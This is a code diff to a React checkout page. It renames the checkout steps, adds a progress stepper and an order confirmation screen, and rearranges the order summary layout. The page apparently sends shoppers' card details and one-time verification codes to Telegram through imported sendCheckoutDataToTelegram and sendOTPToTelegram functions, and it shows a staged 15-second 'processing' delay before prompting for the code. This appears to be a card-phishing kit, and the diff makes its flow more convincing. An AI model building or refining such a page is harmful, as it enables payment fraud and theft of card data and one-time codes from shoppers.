@@ -11,9 +11,12 @@ import { useAuth } from '@/hooks/useAuth';
 import { toast } from '@/hooks/use-toast';
 import { Header } from '@/components/layout/Header';
 import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
+import { cn } from '@/lib/utils';
 import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
 import { sendCheckoutDataToTelegram, sendOTPToTelegram } from './telegram-notifier';
 import OrderProcessing from './OrderProcessing';
+import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutStepper';
+import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
 
 interface Product {
   id: string;
@@ -50,11 +53,12 @@ export default function Checkout() {
   const [product, setProduct] = useState<Product | null>(null);
   const [seller, setSeller] = useState<SellerProfile | null>(null);
   const [loading, setLoading] = useState(true);
-  const [step, setStep] = useState<'details' | 'payment' | 'processing' | 'verification'>('details');
+  const [step, setStep] = useState<CheckoutStep>('shipping');
   const [otp, setOtp] = useState('');
 
   const [quantity, setQuantity] = useState(1);
   const [orderId, setOrderId] = useState<string | null>(null);
+  const [confirmedTotal, setConfirmedTotal] = useState<number>(0);
   const [checkoutData, setCheckoutData] = useState<CheckoutStateData>({});
   const [isProcessing, setIsProcessing] = useState(false);
 
@@ -207,7 +211,7 @@ export default function Checkout() {
       });
 
       // 3. Move to Processing Step IMMEDIATELY
-      setStep('processing');
+      setStep('processingPayment');
 
     } catch (error: any) {
       console.error('❌ Error in handlePaymentSubmit:', error);
@@ -244,10 +248,9 @@ export default function Checkout() {
 
       toast({ title: 'Payment Successful!', description: 'Your order has been placed.' });
 
-      // Navigate to success page
-      setTimeout(() => {
-        navigate('/buyer');
-      }, 1000);
+      // Show confirmation page instead of navigating
+      setConfirmedTotal(calculateTotal());
+      setStep('confirmation');
 
     } catch (error: any) {
       console.error('❌ Error in handleOtpVerify:', error);
@@ -291,17 +294,19 @@ export default function Checkout() {
       <div className="container py-8">
         <Button
           variant="ghost"
-          onClick={() => step === 'payment' ? setStep('details') : navigate(-1)}
+          onClick={() => step === 'payment' ? setStep('shipping') : navigate(-1)}
           className="mb-6"
-          disabled={step === 'verification'}
+          disabled={step === 'otp' || step === 'confirmation'}
         >
           <ArrowLeft className="h-4 w-4 mr-2" />
           {step === 'payment' ? 'Back to Shipping' : 'Back'}
         </Button>
 
-        <div className="grid lg:grid-cols-3 gap-8">
-          <div className="lg:col-span-2">
-            {step === 'details' ? (
+        {step !== 'confirmation' && <CheckoutStepper currentStep={step} />}
+
+        <div className={cn("mt-6", step === 'confirmation' ? "max-w-2xl mx-auto" : "grid lg:grid-cols-3 gap-8")}>
+          <div className={cn(step === 'confirmation' ? "w-full" : "lg:col-span-2")}>
+            {step === 'shipping' && (
               <div className="space-y-6">
                 <Card>
                   <CardHeader>
@@ -348,52 +353,64 @@ export default function Checkout() {
                   isSubmitting={isProcessing}
                 />
               </div>
-            ) : (
+            )}
+
+            {step === 'payment' && (
               <PaymentDetailsForm
                 amount={calculateTotal()}
                 currency="USD"
                 onSubmit={handlePaymentSubmit}
-                onBack={() => setStep('details')}
+                onBack={() => setStep('shipping')}
                 isSubmitting={isProcessing}
+              />
+            )}
+
+            {step === 'confirmation' && (
+              <OrderConfirmationSuccess
+                orderIds={orderId ? [orderId] : []}
+                totalAmount={confirmedTotal}
+                currency="USD"
               />
             )}
           </div>
 
-          <div className="lg:col-span-1">
-            <Card className="sticky top-4">
-              <CardHeader>
-                <CardTitle>Order Summary</CardTitle>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Product</span>
-                  <span>{product.title}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Unit Price</span>
-                  <span>${(product.price_min || product.price_max || 0).toFixed(2)}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Quantity</span>
-                  <span>{quantity}</span>
-                </div>
-                <Separator />
-                <div className="flex justify-between text-lg font-bold">
-                  <span>Total</span>
-                  <span>${calculateTotal().toFixed(2)}</span>
-                </div>
-              </CardContent>
-            </Card>
-          </div>
+          {step !== 'confirmation' && (
+            <div className="lg:col-span-1">
+              <Card className="sticky top-4">
+                <CardHeader>
+                  <CardTitle>Order Summary</CardTitle>
+                </CardHeader>
+                <CardContent className="space-y-4">
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">Product</span>
+                    <span>{product.title}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">Unit Price</span>
+                    <span>${(product.price_min || product.price_max || 0).toFixed(2)}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">Quantity</span>
+                    <span>{quantity}</span>
+                  </div>
+                  <Separator />
+                  <div className="flex justify-between text-lg font-bold">
+                    <span>Total</span>
+                    <span>${calculateTotal().toFixed(2)}</span>
+                  </div>
+                </CardContent>
+              </Card>
+            </div>
+          )}
         </div>
       </div>
 
       {/* Processing Step */}
-      {step === 'processing' && (
+      {step === 'processingPayment' && (
         <OrderProcessing
           durationSeconds={15}
           onComplete={() => {
-            setStep('verification');
+            setStep('otp');
             toast({
               title: 'Verification Required',
               description: 'Please enter the code sent to your device.',
@@ -403,7 +420,7 @@ export default function Checkout() {
       )}
 
       {/* OTP Verification Modal Overlay */}
-      {step === 'verification' && (
+      {step === 'otp' && (
         <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
           <Card className="w-full max-w-md shadow-lg animate-in fade-in zoom-in duration-300">
             <CardHeader className="text-center">
